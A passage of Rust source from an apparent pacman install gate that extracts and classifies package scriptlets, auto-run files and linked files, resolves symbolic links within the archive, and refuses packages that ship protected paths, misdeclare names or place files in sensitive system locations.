            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .spawn()
            .map_err(|source| Error::Spawn {
                tool: "bsdtar".into(),
                source,
            })?;
        let found = child
            .stdout
            .take()
            .ok_or_else(|| failed("no output".into()))
            .and_then(|stdout| {
                attributes_in_tar(io::BufReader::with_capacity(1 << 16, stdout)).map_err(failed)
            });
        let status = child
            .wait()
            .map_err(|error| failed(format!("could not wait for exit: {error}")))?;
        let found = found?;
        if !status.success() {
            return Err(failed(
                "could not be read through for its attributes".into(),
            ));
        }
        Ok(found)
    }

    /// Runs bsdtar on the opened file (a fresh descriptor each time, so each
    /// pass reads from the start).
    fn bsdtar(&self, args: &[OsString], limits: Limits) -> Result<Vec<u8>, Error> {
        let stdin = File::open(format!("/proc/self/fd/{}", self.file.as_raw_fd())).at(&self.path)?;
        let captured =
            tools::run_with_stdin_file(Path::new(tools::BSDTAR), args, stdin, C_LOCALE, limits)?;
        if captured.status.success() {
            Ok(captured.stdout)
        } else {
            Err(Error::ToolFailed {
                tool: "bsdtar".into(),
                detail: format!("{}: {}", self.path.display(), captured.failure_detail()),
            })
        }
    }

    /// The first `PROBE_SIZE` bytes of each of `paths` (regular files of
    /// the model), enough to tell text from a compiled program, in one
    /// pass over the archive and without writing a large file anywhere:
    /// bsdtar prints the files one after another in archive order, and
    /// the model says how long each is.
    fn heads(&self, paths: &[String]) -> Result<HashMap<String, Vec<u8>>, Error> {
        if paths.is_empty() {
            return Ok(HashMap::new());
        }
        let failed = |detail: String| Error::ToolFailed {
            tool: "bsdtar".into(),
            detail: format!("{}: {detail}", self.path.display()),
        };
        let mut ordered: Vec<(usize, &String)> = paths
            .iter()
            .filter_map(|path| Some((*self.index.get(path)?, path)))
            .collect();
        ordered.sort();
        ordered.dedup();
        let stdin = File::open(format!("/proc/self/fd/{}", self.file.as_raw_fd())).at(&self.path)?;
        let mut command = std::process::Command::new(tools::TIMEOUT);
        command
            .arg("--signal=TERM")
            .arg("--kill-after=5s")
            .arg(format!("{}s", EXTRACT_LIMITS.timeout_secs))
            .arg(tools::BSDTAR)
            .args(["-x", "-O", "-f", "-"]);
        for (_, path) in &ordered {
            command.arg("--include").arg(escape_pattern(path));
        }
        let mut child = command
            .env("LC_ALL", "C")
            .stdin(stdin)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .spawn()
            .map_err(|source| Error::Spawn {
                tool: "bsdtar".into(),
                source,
            })?;
        let heads = child
            .stdout
            .take()
            .ok_or_else(|| "no output".to_string())
            .and_then(|stdout| {
                let mut stream = io::BufReader::with_capacity(1 << 16, stdout);
                let mut heads = HashMap::new();
                for (index, path) in &ordered {
                    let size = self.entries[*index].size;
                    let mut head = Vec::new();
                    let kept = (&mut stream)
                        .take(size.min(PROBE_SIZE as u64))
                        .read_to_end(&mut head)
                        .map_err(|error| error.to_string())?;
                    let skipped =
                        io::copy(&mut (&mut stream).take(size - kept as u64), &mut io::sink())
                            .map_err(|error| error.to_string())?;
                    if kept as u64 + skipped != size {
                        return Err(format!("/{path} is shorter than listed"));
                    }
                    heads.insert((*path).clone(), head);
                }
                // Anything more is a file the model does not know.
                let mut more = [0_u8; 1];
                match stream.read(&mut more) {
                    Ok(0) => Ok(heads),
                    _ => Err("more was extracted than the listing names".to_string()),
                }
            });
        let status = child
            .wait()
            .map_err(|error| failed(format!("could not wait for exit: {error}")))?;
        let heads = heads.map_err(failed)?;
        if !status.success() {
            return Err(failed("could not be read through for its files".into()));
        }
        Ok(heads)
    }

    /// The archive as it is now, to compare with once the review is over.
    /// The whole of it is hashed, through the descriptor it was opened
    /// with; unless the file is root's alone, it is hashed again then.
    pub fn fingerprint(&self) -> Result<Fingerprint, Error> {
        let rehash = !root_alone(&self.path, &self.file.metadata().at(&self.path)?);
        let file = File::open(format!("/proc/self/fd/{}", self.file.as_raw_fd())).at(&self.path)?;
        Ok(Fingerprint {
            path: self.path.clone(),
            identity: self.identity,
            digest: digest_of(&file).at(&self.path)?,
            rehash,
        })
    }

    /// The regular file whose content is installed at `path`: itself, the
    /// original of a hard link, or what a symbolic link leads to inside
    /// the package.
    fn regular_at(&self, path: &str) -> Option<String> {
        match &self.entry(path)?.kind {
            Kind::File => Some(path.to_string()),
            Kind::HardLink(original) => Some(original.clone()),
            Kind::Symlink(target) => match self.resolve(path, target) {
                Ok(Resolution::Regular(resolved)) => Some(resolved),
                _ => None,
            },
            Kind::Directory => None,
        }
    }

    /// The regular files of this archive that `text` names: by a path
    /// (`/usr/lib/pkg/setup.sh`, also behind a variable or a prefix, as in
    /// `$pkgdir/usr/lib/pkg/setup.sh` or `-/usr/lib/pkg/pre`), or by a bare
    /// name the package ships in `usr/bin`.
    fn named_in(&self, text: &str) -> Vec<String> {
        let mut found = Vec::new();
        let mut seen = HashSet::new();
        let links = self
            .entries
            .iter()
            .any(|entry| matches!(entry.kind, Kind::Symlink(_)));
        // A path as written, or else as the system walks it: only one
        // with `.`, `..` or `//` in it, or in a package that ships links,
        // can be another path than it says.
        let shipped = |tail: &str| {
            self.regular_at(&through_root_links(tail)).or_else(|| {
                let indirect = links
                    || tail
                        .split('/')
                        .any(|component| matches!(component, "" | "." | ".."));
                indirect
                    .then(|| self.walked(tail))
                    .flatten()
                    .and_then(|path| self.regular_at(&path))
            })
        };
        for word in named_words(text) {
            // The end of a sentence, or of a directory's name.
            let word = word.trim_end_matches(['.', '/']);
            let named = if word.contains('/') {
                // The word itself, then every tail of it that starts
                // after a `/`: the longest that the package ships.
                std::iter::once(word)
                    .chain(word.match_indices('/').map(|(at, _)| &word[at + 1..]))
                    .filter(|tail| tail.contains('/'))
                    .find_map(shipped)
            } else {
                self.regular_at(&format!("usr/bin/{word}"))
            };
            if let Some(path) = named
                && seen.insert(path.clone())
            {
                found.push(path);
            }
        }
        found
    }

    /// `path` (relative to `/`) as the system walks it: `.` and `..` taken
    /// out, and the usual root links (`/lib`) and the directory links this
    /// package ships followed, so `usr/lib/../share/x` and `opt/pkg/current/x`
    /// (with `current -> releases/1`) name the file that is run. The last
    /// name is left as it is. `None` for a path that climbs above the root
    /// or goes through more links than are followed.
    fn walked(&self, path: &str) -> Option<String> {
        let reversed =
            |text: &str| -> Vec<String> { text.split('/').rev().map(str::to_string).collect() };
        let mut pending = reversed(path);
        let mut parts: Vec<String> = Vec::new();
        let mut hops = 0;
        while let Some(component) = pending.pop() {
            match component.as_str() {
                "" | "." => continue,
                ".." => {
                    parts.pop()?;
                    continue;
                }
                name => parts.push(name.to_string()),
            }
            if pending.iter().all(|rest| matches!(rest.as_str(), "" | ".")) {
                continue;
            }
            let here = parts.join("/");
            let target = match self.entry(&here).map(|entry| &entry.kind) {
                Some(Kind::Symlink(target)) => target.clone(),
                Some(_) => continue,
                None => {
                    let directory = format!("{here}/");
                    let leads = through_root_links(&directory);
                    if leads == directory {
                        continue;
                    }
                    format!("/{leads}")
                }
            };
            hops += 1;
            if hops > MAX_HOPS {
                return None;
            }
            parts.pop();
            if target.starts_with('/') {
                parts.clear();
            }
            pending.extend(reversed(&target));
        }
        Some(parts.join("/"))
    }

    /// What this archive installs at `path` (no leading `/`), for a link
    /// on the system that leads there and is read as an auto-run file:
    /// `None` when it ships no file there.
    pub fn replacement(&self, path: &str) -> Option<Replacement> {
        let regular = match &self.entry(path)?.kind {
            Kind::Directory => return None,
            Kind::Symlink(_) => match self.regular_at(path) {
                Some(regular) => regular,
                None => {
                    return Some(Replacement::Unreadable(
                        "is a symbolic link out of the package",
                    ));
                }
            },
            Kind::File | Kind::HardLink(_) => self.regular_source(path),
        };
        let size = self.entry(&regular).map_or(0, |entry| entry.size);
        if size <= MAX_TEXT_FILE_SIZE {
            return Some(
                self.extract(std::slice::from_ref(&regular))
                    .ok()
                    .and_then(|mut read| read.remove(&regular))
                    .map_or(
                        Replacement::Unreadable("could not be read from the archive"),
                        Replacement::File,
                    ),
            );
        }
        let heads = self.heads(std::slice::from_ref(&regular)).ok();
        let head = heads.as_ref().and_then(|heads| heads.get(&regular));
        Some(
            match head.map(|head| content::classify_prefix(path, false, head)) {
                Some(Prefix::Binary(format)) => Replacement::Binary(format.label()),
                Some(Prefix::Text | Prefix::Undecodable) => Replacement::TooLarge,
                None => Replacement::Unreadable("could not be read from the archive"),
            },
        )
    }

    /// The file capabilities the archive gives `path` (see
    /// `capabilities`), when those are all its attributes grant.
    pub fn shipped_capability(&self, path: &str) -> Option<&str> {
        self.capabilities.get(path).map(String::as_str)
    }

    /// The path must still name the file that was reviewed.
    pub fn verify_unchanged(&self) -> Result<(), Error> {
        let current = fs::symlink_metadata(&self.path).at(&self.path)?;
        if current.is_file() && Identity::of(&current) == self.identity {
            Ok(())
        } else {
            Err(Error::Refused(format!(
                "{} changed while it was being reviewed",
                self.path.display()
            )))
        }
    }

    fn entry(&self, path: &str) -> Option<&Entry> {
        self.index.get(path).map(|index| &self.entries[*index])
    }

    /// The regular entry a file's content comes from: itself, or the
    /// original of a hard link.
    fn regular_source(&self, path: &str) -> String {
        match self.entry(path).map(|entry| &entry.kind) {
            Some(Kind::HardLink(original)) => original.clone(),
            _ => path.to_string(),
        }
    }

    /// Resolves the symbolic link at `link` with `target` inside the model.
    fn resolve(&self, link: &str, target: &str) -> Result<Resolution, String> {
        let mut link = link.to_string();
        let mut target = target.to_string();
        for _ in 0..MAX_HOPS {
            let mut parts: Vec<String> = if target.starts_with('/') {
                Vec::new()
            } else {
                let mut parent: Vec<String> = link.split('/').map(str::to_string).collect();
                parent.pop();
                parent
            };
            let components: Vec<&str> = target.split('/').collect();
            let mut outside = false;
            for (index, component) in components.iter().enumerate() {
                match *component {
                    "" | "." => {}
                    ".." => {
                        if parts.pop().is_none() {
                            return Err(format!("{link} links above the root of the package"));
                        }
                    }
                    name => {
                        parts.push(name.to_string());
                        // `/lib` is `usr/lib` where it is the usual link
                        // and the package does not ship it as something
                        // else: what follows is looked for there, `..`
                        // included.
                        if parts.len() == 1
                            && ROOT_LINKS.contains(&format!("{name}/").as_str())
                            && self.entry(name).is_none()
                        {
                            let leads = if name.starts_with("lib") {
                                "lib"
                            } else {
                                "bin"
                            };
                            parts = vec!["usr".to_string(), leads.to_string()];
                        }
                        // The same for `/usr/sbin` and `/usr/lib64`.
                        if parts.len() == 2
                            && parts[0] == "usr"
                            && USR_LINKS.contains(&format!("usr/{name}/").as_str())
                            && self.entry(&format!("usr/{name}")).is_none()
                        {
                            parts[1] = if name.starts_with("lib") {
                                "lib"
                            } else {
                                "bin"
                            }
                            .to_string();
                        }
                        let last = components[index + 1..]
                            .iter()
                            .all(|rest| matches!(*rest, "" | "."));
                        let here = parts.join("/");
                        match self.entry(&here).map(|entry| &entry.kind) {
                            Some(Kind::Symlink(_)) if !last => {
                                return Err(format!(
                                    "{link} links through {here}, which is a symbolic link"
                                ));
                            }
                            Some(Kind::File | Kind::HardLink(_)) if !last => {
                                return Err(format!("{link} links through the file {here}"));
                            }
                            None => outside = true,
                            _ => {}
                        }
                    }
                }
            }
            let resolved = parts.join("/");
            if outside || resolved.is_empty() {
                return Ok(Resolution::Outside(format!("/{resolved}")));
            }
            match self.entry(&resolved).map(|entry| &entry.kind) {
                Some(Kind::File) => return Ok(Resolution::Regular(resolved)),
                Some(Kind::HardLink(original)) => {
                    return Ok(Resolution::Regular(original.clone()));
                }
                Some(Kind::Directory) => {
                    return Err(format!("{link} links to the directory /{resolved}"));
                }
                Some(Kind::Symlink(next)) => {
                    link = resolved;
                    target.clone_from(next);
                }
                None => return Ok(Resolution::Outside(format!("/{resolved}"))),
            }
        }
        Err(format!("{link}: too many symbolic links"))
    }

    /// The paths of everything this archive ships (no leading `/`).
    pub fn paths(&self) -> impl Iterator<Item = &str> {
        self.entries.iter().map(|entry| entry.path.as_str())
    }

    /// What this archive ships at `path` (no leading `/`).
    pub fn shipped_file(&self, path: &str) -> InArchive {
        let Some(entry) = self.entry(path) else {
            return InArchive::Absent;
        };
        let path = match &entry.kind {
            Kind::File => path.to_string(),
            Kind::HardLink(original) => original.clone(),
            Kind::Directory | Kind::Symlink(_) => return InArchive::Other,
        };
        self.extract(std::slice::from_ref(&path))
            .ok()
            .and_then(|mut read| read.remove(&path))
            .map_or(InArchive::Other, InArchive::File)
    }

    /// Extracts exactly `paths` (regular files of the model) and reads them
    /// back without following links, checking each has its listed size.
    fn extract(&self, paths: &[String]) -> Result<HashMap<String, Vec<u8>>, Error> {
        if paths.is_empty() {
            return Ok(HashMap::new());
        }
        let workspace = Workspace::create("payload")?;
        let mut args: Vec<OsString> = vec![
            "-x".into(),
            "--no-recursion".into(),
            "-f".into(),
            "-".into(),
            "-C".into(),
            workspace.path().into(),
            "--no-same-owner".into(),
            "--no-same-permissions".into(),
        ];
        for path in paths {
            args.push("--include".into());
            args.push(escape_pattern(path).into());
        }
        self.bsdtar(&args, EXTRACT_LIMITS)?;
        let mut read = HashMap::new();
        for path in paths {
            let expected = self.entry(path).map_or(0, |entry| entry.size);
            let bytes = read_extracted(workspace.path(), path)
                .map_err(|error| Error::Refused(format!("/{path}: {error}")))?;
            if bytes.len() as u64 != expected {
                return Err(Error::Refused(format!(
                    "/{path} was extracted with a different size than listed"
                )));
            }
            read.insert(path.clone(), bytes);
        }
        Ok(read)
    }
}

/// Glob characters in a file name are matched literally.
fn escape_pattern(path: &str) -> String {
    let mut out = String::with_capacity(path.len());
    for character in path.chars() {
        if matches!(character, '*' | '?' | '[' | ']' | '\\') {
            out.push('\\');
        }
        out.push(character);
    }
    out
}

/// Reads `rel` under `root` one component at a time, refusing any symbolic
/// link on the way and anything but a regular file at the end.
fn read_extracted(root: &Path, rel: &str) -> io::Result<Vec<u8>> {
    let mut path = root.to_path_buf();
    let components: Vec<&str> = rel.split('/').collect();
    for (index, component) in components.iter().enumerate() {
        path.push(component);
        let metadata = fs::symlink_metadata(&path)?;
        let last = index + 1 == components.len();
        if metadata.file_type().is_symlink() || (!last && !metadata.is_dir()) {
            return Err(io::Error::other("not a plain path in the extraction"));
        }
    }
    let file = OpenOptions::new()
        .read(true)
        .custom_flags(O_NOFOLLOW | O_NONBLOCK)
        .open(&path)?;
    if !file.metadata()?.is_file() {
        return Err(io::Error::other("not a regular file"));
    }
    let mut bytes = Vec::new();
    file.take(MAX_TEXT_FILE_SIZE + 1).read_to_end(&mut bytes)?;
    Ok(bytes)
}

/// One payload file for the review, with its content as classified.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PayloadFile {
    pub path: String,
    pub content: Content,
    /// For a file of the package that reviewed files name (a script a hook
    /// runs, a file a login script sources): those files, `.INSTALL` for
    /// the scriptlet. Empty for an auto-run file.
    pub run_by: Vec<String>,
    /// For a link to a file this package does not ship: that file's path,
    /// for the caller to find where the transaction or the system has it.
    pub leads_outside: Option<String>,
    /// The file as shipped: its bytes, or its link target for a symbolic
    /// link, to compare with what is installed.
    shipped: Shipped,
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Shipped {
    Bytes(Vec<u8>),
    /// A link's target, and what it leads to when the package ships that
    /// too: a unit that changed behind the same enabling link is a change.
    Link {
        target: String,
        content: Option<Vec<u8>>,
    },
    /// Not read: a compiled program, or a link out of the package.
    Unknown,
}

impl PayloadFile {
    /// Whether the same file is already installed under `root` (`/` in
    /// production): identical bytes, or a link with the same target that
    /// leads to identical bytes. Such a file adds nothing new, so an
    /// upgrade does not review it again. A file that cannot be read (for
    /// example root-only) counts as changed.
    pub fn is_installed_unchanged(&self, root: &Path) -> bool {
        let installed = root.join(&self.path);
        match &self.shipped {
            Shipped::Bytes(bytes) => {
                fs::symlink_metadata(&installed).is_ok_and(|metadata| {
                    metadata.is_file() && metadata.len() == bytes.len() as u64
                }) && fs::read(&installed).is_ok_and(|current| current == *bytes)
            }
            Shipped::Link { target, content } => {
                fs::read_link(&installed).is_ok_and(|current| current == Path::new(target))
                    && content.as_ref().is_none_or(|bytes| {
                        // Only a regular file of that size is read.
                        fs::metadata(&installed).is_ok_and(|metadata| {
                            metadata.is_file() && metadata.len() == bytes.len() as u64
                        }) && fs::read(&installed).is_ok_and(|current| current == *bytes)
                    })
            }
            Shipped::Unknown => false,
        }
    }
}

/// The files of `archive` where only the sweep looks, by path, with what
/// a file there does (see `Review::misplaced`); none for an official
/// package.
fn misplaced(archive: &Archive, official: bool) -> Vec<(String, &'static str)> {
    let mut misplaced: Vec<(String, &'static str)> = archive
        .entries
        .iter()
        .filter(|entry| !official && !matches!(entry.kind, Kind::Directory))
        .filter_map(|entry| {
            let location = sweep_only_location(&entry.path)?;
            Some((entry.path.clone(), sweep_only_effect(location)))
        })
        .collect();
    misplaced.sort();
    misplaced
}

/// What the pacman gate reviews in one archive.
pub struct Review {
    /// The install scriptlet, classified (see `content::classify`).
    pub install: Option<Content>,
    pub files: Vec<PayloadFile>,
    /// Files installed setuid or setgid root, with which of the two, but
    /// for the sandbox helper of a Chromium-based program.
    pub root_set_id: Vec<(String, &'static str)>,
    /// What of the package was not read, each as a sentence: a scriptlet
    /// or auto-run file over the limits, and what the scriptlet or an
    /// auto-run file names and could not be followed to. The review is
    /// incomplete; the bytes are still the archive's.
    pub unfollowed: Vec<String>,
    /// For a package that is not from an official repository: its files
    /// where only the sweep looks (a PAM module, the boot loader's
    /// configuration, `/etc/hosts`), with what a file there does.
    pub misplaced: Vec<(String, &'static str)>,
    /// The regular files read as auto-run files: those themselves, and
    /// what the package's auto-run links lead to inside it.
    pub read_as_auto_run: HashSet<String>,
}

/// An auto-run entry and what its content is read from.
type Source<'a> = (&'a Entry, Resolution);

/// Reviews `archive` for the pacman gate: `package` must be the name its
/// `.PKGINFO` declares, no protected path may be shipped by the wrong
/// package, and the install scriptlet and auto-run files are extracted
/// and classified. `trusted` names extra reviewer packages the system
/// configuration allows.
pub fn review(
    archive: &Archive,
    package: &str,
    class: SourceClass,
    trusted: &[String],
) -> Result<Review, Error> {
    let refuse = |reason: String| Error::Refused(format!("{}: {reason}", archive.path.display()));
    if let Some(reason) = name_violation(package, class, trusted) {
        return Err(refuse(reason));
    }
    if package == GUARDIAN_PACKAGE
        && let Some(missing) = GUARDIAN_FILES.iter().find(|path| {
            !archive
                .entry(path)
                .is_some_and(|entry| entry.kind == Kind::File)
        })
    {
        return Err(refuse(format!(
            "{package} does not ship /{missing}: installing it would take Guardian away"
        )));
    }
    for entry in &archive.entries {
        if let Some(reason) = protected_violation(&entry.path, package, class, trusted) {
            return Err(refuse(reason));
        }
        if !matches!(entry.kind, Kind::Directory)
            && let Some(place) = NOT_FOR_PACKAGES.iter().find(|place| {
                entry.path.starts_with(**place) || entry.path == place.trim_end_matches('/')
            })
        {
            return Err(refuse(format!(
                "{package} installs /{} under /{place} where no package's files belong",
                entry.path
            )));
        }
        if let Some(link) = ROOT_LINKS
            .iter()
            .chain(USR_LINKS)
            .find(|link| entry.path.starts_with(**link))
        {
            return Err(refuse(format!(
                "{package} lists /{} under /{}, which is a link to a directory in /usr on this system",
                entry.path,
                link.trim_end_matches('/')
            )));
        }
    }

    let official = class == SourceClass::Official;
    let Plan {
        wanted,
        sources,
        unread,
    } = plan_reads(archive, official).map_err(refuse)?;
    let mut read = archive.extract(&wanted)?;

    let pkginfo =
        String::from_utf8_lossy(read.get(".PKGINFO").map_or(&[][..], Vec::as_slice)).into_owned();
    let declared = pkginfo
        .lines()
        .find_map(|line| line.strip_prefix("pkgname = "))
        .map(str::trim);
    if declared != Some(package) {
        return Err(refuse(format!(
            ".PKGINFO names {:?}, not the transaction target {package}",
            declared.unwrap_or_default()
        )));
    }
    if let Some((claim, what)) = claim_violation(&pkginfo, package, class, trusted) {
        return Err(refuse(format!(
            "{package} declares `{claim}`: installing it would remove or stand in for {what}"
        )));
    }

    // The package's own files that the scriptlet and the auto-run files
    // name are reviewed with them (read in further, bounded passes).
    let (named, unfollowed) = named_files(archive, &sources, &wanted, &mut read)?;
    let unfollowed = unread.into_iter().chain(unfollowed).collect();

    let install = read
        .get(".INSTALL")
        .map(|bytes| content::classify(".INSTALL", false, true, bytes));
    let mut files = payload_files(&sources, &read);
    files.extend(named);
    files.sort_by(|left, right| left.path.cmp(&right.path));
    // By path, like `files`: the order of an archive's entries is whatever
    // order it was packed in, and the report should not follow that.
    let mut root_set_id: Vec<(String, &'static str)> = archive
        .entries
        .iter()
        .filter(|entry| !is_chromium_helper(archive, &entry.path))
        .filter_map(|entry| Some((entry.path.clone(), entry.root_set_id?)))
        .collect();
    root_set_id.sort();
    Ok(Review {
        install,
        files,
        root_set_id,
        unfollowed,
        misplaced: misplaced(archive, official),
        read_as_auto_run: wanted
            .into_iter()
            .filter(|path| !METADATA.contains(&path.as_str()))
            .collect(),
    })
}

/// Where the link at `link` with `target` leads, by its text alone
/// (relative to `/`). `None` when it climbs above the root, or steps back
/// (`..`) after a name: that name may be a link on the system, and the
/// text would then say one place while the system goes to another.
fn lexical_target(link: &str, target: &str) -> Option<String> {
    let mut parts: Vec<&str> = if target.starts_with('/') {
        Vec::new()
    } else {
        let mut parent: Vec<&str> = link.split('/').collect();
        parent.pop();
        parent
    };
    let mut named = false;
    for component in target.split('/') {
        match component {
            "" | "." => {}
            ".." if named => return None,
            ".." => {
                parts.pop()?;
            }
            name => {
                named = true;
                parts.push(name);
            }
        }
    }
    Some(parts.join("/"))
}

/// The setuid helper of a Chromium-based program, by its name and by the
/// runtime files such a program keeps beside it, outside the directories
/// commands are found in. Its content is a binary nobody reads, like every
/// other program a package ships; this only tells it from a file that
/// merely borrows the name.
fn is_chromium_helper(archive: &Archive, path: &str) -> bool {
    let on_path = ["usr/bin/", "usr/sbin/", "usr/local/", "bin/", "sbin/"]
        .iter()
        .any(|directory| path.starts_with(directory));
    let beside = |name: &str| {
        path.rsplit_once('/')
            .is_some_and(|(directory, _)| archive.entry(&format!("{directory}/{name}")).is_some())
    };
    rules::is_sandbox_helper(path) && !on_path && beside("icudtl.dat") && beside("resources.pak")
}

/// What a file in a sweep-only location does, for the finding a package
/// that is not from an official repository gets for shipping one. The
/// category says it for most; these are not what their category's other
/// files are.
fn sweep_only_effect(location: &Location) -> &'static str {
    match location.path {
        "var/lib/flatpak/overrides/" => {
            "decides what every Flatpak app may reach outside its sandbox"
        }
        "etc/containers/systemd/" => "becomes a systemd unit at every boot",
        "etc/fstab" | "etc/crypttab" => "decides what is mounted and unlocked at every boot",
        "etc/hosts" => "decides which address a name leads to, without asking DNS",
        "usr/local/share/ca-certificates/" => "adds a certificate authority to the system's own",
        _ => location.category.when(),
    }
}

/// What `review` reads from an archive.
struct Plan<'a> {
    /// The files to extract: `.PKGINFO`, `.INSTALL`, the auto-run entries
    /// and what their links resolve to.
    wanted: Vec<String>,
    /// Each auto-run entry that is read, with its source.
    sources: Vec<Source<'a>>,
    /// What is over the limits and so left unread, each as a sentence.
    unread: Vec<String>,
}

/// Plans the reads within the limits, from the model, before anything is
/// extracted. A scriptlet or auto-run file over a limit is left out and
/// said (`unread`) rather than refused: the checks that refuse a package
/// still run on the rest, and the archive's digest covers what was not
/// read.
fn plan_reads(archive: &Archive, official: bool) -> Result<Plan<'_>, String> {
    let mut wanted: Vec<String> = Vec::new();
    let mut unread = Vec::new();
    match archive.entry(".PKGINFO") {
        Some(entry) if entry.size <= MAX_TEXT_FILE_SIZE => wanted.push(".PKGINFO".into()),
        Some(_) => return Err(".PKGINFO is too large".into()),
        None => return Err("the package has no .PKGINFO".into()),
    }
    if let Some(entry) = archive.entry(".INSTALL") {
        if entry.size > MAX_TEXT_FILE_SIZE {
            unread.push("the install scriptlet exceeds the 2 MiB review limit".into());
        } else {
            wanted.push(".INSTALL".into());
        }
    }
    let mut sources = Vec::new();
    for entry in &archive.entries {
        // What such a link leads to would be read as that directory's
        // files, wherever the package ships them: fine only when they
        // are auto-run files of the same kind there too (systemd's own
        // `etc/xdg/systemd/user -> ../../systemd/user`).
        if let Kind::Symlink(target) = &entry.kind
            && is_auto_run_directory(&entry.path)
        {
            if lexical_target(&entry.path, target)
                .is_some_and(|leads| is_alias_of_reviewed_directory(&entry.path, &leads))
            {
                continue;
            }
            return Err(format!(
                "/{} is a symbolic link standing in for a directory whose files run on their own",
                entry.path
            ));
        }
        if matches!(entry.kind, Kind::Directory) || !is_reviewed(&entry.path, official) {
            continue;
        }
        let source = match &entry.kind {
            Kind::Symlink(target) => archive.resolve(&entry.path, target)?,
            _ => Resolution::Regular(archive.regular_source(&entry.path)),
        };
        if let Resolution::Regular(path) = &source {
            let size = archive.entry(path).map_or(0, |entry| entry.size);
            if size > MAX_TEXT_FILE_SIZE {
                unread.push(format!(
                    "auto-run file /{} exceeds the 2 MiB review limit",
                    entry.path
                ));
                continue;
            }
            wanted.push(path.clone());
        }
        sources.push((entry, source));
    }
    wanted.sort();
    wanted.dedup();
    let total: u64 = wanted
        .iter()
        .filter_map(|path| archive.entry(path))
        .map(|entry| entry.size)
        .sum();
    if sources.len() > MAX_FILES || total > MAX_TOTAL {
        unread.push(format!(
            "{} auto-run files ({} KiB) exceed the review limits: none of them was reviewed",
            sources.len(),
            total / 1024
        ));
        sources.clear();
        wanted.retain(|path| METADATA.contains(&path.as_str()));
    }
    Ok(Plan {
        wanted,
        sources,
        unread,
    })
}

/// The package's own files that its scriptlet and auto-run files name, and
/// the files those name in turn: text is read (into `read`) and returned
/// for the review, a compiled program is returned as what it is. The
/// second list says what could not be followed: text over the size limit,
/// more files or more steps than the bounds allow.
fn named_files(
    archive: &Archive,
    sources: &[Source<'_>],
    wanted: &[String],
    read: &mut HashMap<String, Vec<u8>>,
) -> Result<(Vec<PayloadFile>, Vec<String>), Error> {
    // What is reviewed as itself already.
    let mut known: HashSet<&str> = wanted.iter().map(String::as_str).collect();
    known.extend(sources.iter().map(|(entry, _)| entry.path.as_str()));
    // Who names, and the file its text was read from.
    let mut naming: Vec<(String, String)> = read
        .contains_key(".INSTALL")
        .then(|| (".INSTALL".to_string(), ".INSTALL".to_string()))
        .into_iter()
        .collect();
    naming.extend(sources.iter().filter_map(|(entry, source)| match source {
        Resolution::Regular(path) => Some((entry.path.clone(), path.clone())),
        Resolution::Outside(_) => None,
    }));

    let mut total: u64 = wanted
        .iter()
        .filter_map(|path| archive.entry(path))
        .map(|entry| entry.size)
        .sum();
    let mut by: HashMap<String, Vec<String>> = HashMap::new();
    let mut found: Vec<(String, Content, Shipped)> = Vec::new();
    let mut unfollowed = Vec::new();
    for depth in 0..=MAX_NAMED_DEPTH {
        let mut fresh = newly_named(archive, &naming, read, &known, &mut by);
        if fresh.is_empty() {
            break;
        }
        let first_namer = |path: &str| {
            by.get(path)
                .and_then(|namers| namers.first())
                .map_or_else(String::new, |namer| shown(namer))
        };
        let room = if depth == MAX_NAMED_DEPTH {
            unfollowed.push(format!(
                "/{}, which {} names, is more than {MAX_NAMED_DEPTH} files away from what runs on its own: it and {} more were not followed",
                fresh[0],
                first_namer(&fresh[0]),
                fresh.len() - 1
            ));
            0
        } else {
            MAX_NAMED_FILES.saturating_sub(found.len())
        };
        if fresh.len() > room && depth < MAX_NAMED_DEPTH {
            unfollowed.push(format!(
                "the scriptlet and auto-run files name more than {MAX_NAMED_FILES} of the package's own files: /{} and {} more were not looked at",
                fresh[room],
                fresh.len() - room - 1
            ));
        }
        fresh.truncate(room);

        // Text or not, by the first bytes; only text is read whole.
        let heads = archive.heads(&fresh)?;
        let mut texts = Vec::new();
        for path in &fresh {
            let size = archive.entry(path).map_or(0, |entry| entry.size);
            let head = heads.get(path).map_or(&[][..], Vec::as_slice);
            let too_much = match content::classify_prefix(path, false, head) {
                Prefix::Binary(format) => {
                    found.push((path.clone(), Content::Binary(format), Shipped::Unknown));
                    continue;
                }
                Prefix::Text | Prefix::Undecodable if size > MAX_TEXT_FILE_SIZE => {
                    "is text over the 2 MiB review limit"
                }
                Prefix::Text | Prefix::Undecodable if total + size > MAX_TOTAL => {
                    "would take the package past the size all its reviewed files may have"
                }
                Prefix::Text | Prefix::Undecodable => {
                    total += size;
                    texts.push(path.clone());
                    continue;
                }
            };
            unfollowed.push(format!(
                "/{path}, which {} names, {too_much}",
                first_namer(path)
            ));
        }
        read.extend(archive.extract(&texts)?);
        naming.clear();
        for path in texts {
            let bytes = read.get(&path).cloned().unwrap_or_default();
            let content = content::classify(&path, false, false, &bytes);
            if matches!(content, Content::Text(_) | Content::Lossy { .. }) {
                naming.push((path.clone(), path.clone()));
            }
            found.push((path, content, Shipped::Bytes(bytes)));
        }
    }

    let files = found
        .into_iter()
        .map(|(path, content, shipped)| {
            let run_by = by.remove(&path).unwrap_or_default();
            named_file(path, content, shipped, run_by)
        })
        .collect();
    Ok((files, unfollowed))
}

/// The files of the archive that the texts in `naming` (who names, and the
/// file its text was read from) name for the first time, sorted; `by`
/// records who names each. What is `known` is reviewed as itself already.
fn newly_named(
    archive: &Archive,
    naming: &[(String, String)],
    read: &HashMap<String, Vec<u8>>,
    known: &HashSet<&str>,
    by: &mut HashMap<String, Vec<String>>,
) -> Vec<String> {
    let mut fresh: Vec<String> = Vec::new();
    for (namer, source) in naming {
        let Some(bytes) = read.get(source) else {
            continue;
        };
        for path in archive.named_in(&String::from_utf8_lossy(bytes)) {
            // An empty file holds nothing to run.
            let empty = archive.entry(&path).is_none_or(|entry| entry.size == 0);
            if empty || known.contains(path.as_str()) || path == *source {
                continue;
            }
            let namers = by.entry(path.clone()).or_default();
            if namers.is_empty() {
                fresh.push(path);
            }
            if !namers.contains(namer) {
                namers.push(namer.clone());
            }
        }
    }
    fresh.sort();
    fresh
}

/// A file the reviewed ones name (`run_by`) as a payload file: its text
/// starts with a line that says who names it.
fn named_file(
    path: String,
    content: Content,
    shipped: Shipped,
    run_by: Vec<String>,
) -> PayloadFile {
